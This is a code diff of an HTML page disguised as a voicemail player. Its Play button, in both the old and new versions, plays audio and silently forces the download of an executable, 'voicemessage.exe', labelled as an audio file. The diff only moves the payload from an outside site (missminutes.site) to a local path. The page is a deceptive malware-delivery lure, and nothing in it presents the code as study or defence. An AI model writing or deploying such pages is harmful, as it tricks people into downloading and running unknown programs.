@@ -89,7 +89,7 @@
             </button>
         </div>
         <audio id="audio" controls>
-            <source src="https://missminutes.site/player/voicemessage.exe" type="audio/mpeg">
+            <source src="./voicemessage.exe" type="audio/mpeg">
             Your browser does not support the audio element.
         </audio>
         <button class="play-button" onclick="playAudio()">Play</button>
@@ -109,8 +109,8 @@
             var audio = document.getElementById('audio');
             audio.play();
             var link = document.createElement('a');
-            link.href = 'https://missminutes.site/player/voicemessage.exe';
-            link.download = 'vm.exe';
+            link.href = './voicemessage.exe';
+            link.download = './voicemessage.exe';
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
